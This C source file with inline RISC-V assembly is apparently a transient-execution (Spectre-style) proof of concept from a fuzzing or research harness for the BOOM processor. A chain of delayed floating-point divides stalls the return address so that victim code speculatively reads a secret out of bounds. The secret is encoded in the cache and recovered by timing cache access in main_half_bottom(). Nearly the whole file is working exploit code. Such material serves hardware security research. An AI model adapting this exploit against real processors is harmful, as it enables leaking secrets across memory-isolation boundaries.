#include <stdio.h>
#include <string.h>

#include "util.h"
#include "encoding.h"
#include "parafuzz.h"
#include "boom_conf.h"

PARAFUZZ_DEFINE;

void main_half_bottom();

__attribute__((naked))
void exploit() {
  uint64_t dummy1 = 0xa234b057963aef89ul;
  uint64_t dummy2 = 0x56fea3467def0136ul;
  
  INFO_DELAY_START;
  asm("fcvt.s.lu	fa4, %[dummy1]\n"
      "fcvt.s.lu	fa5, %[dummy2]\n"
      "fdiv.s	fa5, fa5, fa4\n"
      "fdiv.s	fa5, fa5, fa4\n"
      "fdiv.s	fa5, fa5, fa4\n"
      "fdiv.s	fa5, fa5, fa4\n"
      "fcvt.lu.s	t0, fa5, rtz\n"
      "add ra, t0, %[return_func]\n"
      INFO_INLINE_ASM(ENUM_INFO_DELAY_END)
      "jalr zero, 0(ra)\n"
      :: [dummy2] "r" (dummy2),
         [dummy1] "r" (dummy1),
         [return_func] "r" (&main_half_bottom)
      : "ra", "t0", "fa4", "fa5");
}

void victim(int64_t offset) {
  INFO_VCTM_START;
  asm("add t0, zero, %[exploit_func]\n"
      "jalr ra, 0(t0)\n"
      :: [exploit_func] "r" (&exploit)
      : "ra", "t0");
  leak_me:
    INFO_TEXE_START;
    uint8_t dummy3 = array[trapoline[offset]*CACHE_BLOCK];
    INFO_TEXE_END;
}

void main_half_bottom() {
  INFO_VCTM_END;
  uint64_t res = access_time(&array[0], guess, 0);
  dump_channel(res, &array[0] + guess*CACHE_BLOCK);
  exit(0);
}

int main(int argc, char* argv[] ) {
  setup();
  guess = get_round_info();
  // uint8_t dummy3 = secret[LEAK_TARGET];
  int64_t secret_offset = (unsigned char*)&secret[LEAK_TARGET] - (unsigned char*)&trapoline;
  victim(secret_offset);

  return 0;
}

